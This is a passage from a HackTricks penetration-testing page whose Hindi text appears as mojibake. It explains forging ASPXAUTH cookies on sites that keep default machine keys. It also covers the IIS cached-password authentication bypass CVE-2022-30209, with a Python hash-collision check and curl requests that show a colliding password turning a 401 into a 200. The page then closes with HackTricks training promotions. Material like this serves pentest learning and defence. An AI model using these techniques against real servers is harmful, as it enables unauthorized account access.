ASPXAUTH рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`validationKey`** (string): рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕-рдХреЛрдбрд┐рдд рдХреБрдВрдЬреАред
* **`decryptionMethod`** (string): (рдбрд┐рдлрд╝реЙрд▓реНрдЯ тАЬAESтАЭ)ред
* **`decryptionIV`** (string): рд╣реЗрдХреНрд╕-рдХреЛрдбрд┐рдд рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡реЗрдХреНрдЯрд░ (рд╢реВрдиреНрдп рдХреЗ рд╡реЗрдХреНрдЯрд░ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ)ред
* **`decryptionKey`** (string): рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕-рдХреЛрдбрд┐рдд рдХреБрдВрдЬреАред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд▓реЛрдЧ рдЗрди рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рдиреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдФрд░ **рдХреБрдХреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдИрдореЗрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ рд╡реЗрдм рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ ASPXAUTH рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк **рд╣рдорд▓реЗ рдХреЗ рддрд╣рдд рд╕рд░реНрд╡рд░ рдкрд░ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ** рдЬрд┐рд╕реЗ рдЖрдк рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдкрд╣рд▓реЗ рд╕рд░реНрд╡рд░ рдореЗрдВ рджреВрд╕рд░реЗ рд╕рд░реНрд╡рд░ рдХреА рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рд╣рдорд▓рд╛ рдЗрд╕ [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) рдореЗрдВ рдХрд╛рдо рдХрд┐рдпрд╛ред

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[рдкреВрд░реНрдг рд░рд┐рдкреЛрд░реНрдЯ рдпрд╣рд╛рдБ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): рдХреЛрдб рдореЗрдВ рдПрдХ рдмрдЧ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╕рд╣реА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛**, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХрд╛ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдПрдХ рдХреБрдВрдЬреА рдкрд░ рд╣рд┐рдЯ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдХреИрд╢** рдореЗрдВ рд╣реИ, рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
